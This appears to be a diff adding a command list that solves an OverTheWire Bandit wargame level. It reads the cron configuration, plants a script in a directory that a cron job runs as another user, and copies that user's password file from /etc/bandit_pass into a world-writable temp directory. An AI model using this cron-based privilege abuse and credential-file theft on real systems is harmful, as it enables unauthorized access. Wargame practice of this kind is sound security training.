@@ -1,0 +1,13 @@
+ls -l /etc/cron.d 
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mktemp -d
+cd /tmp/tmp.********
+chmod 777 /tmp/tmp.********
+touch script.sh
+chmod +x script.sh
+nano script.sh
+cat /etc/bandit_pass/bandit24 > /tmp/tmp.u8YsMsK8h1/password.txt
+cp script.sh /var/spool/bandit24/foo/script.sh
+watch -n 1 ls -l
+cat password.txt
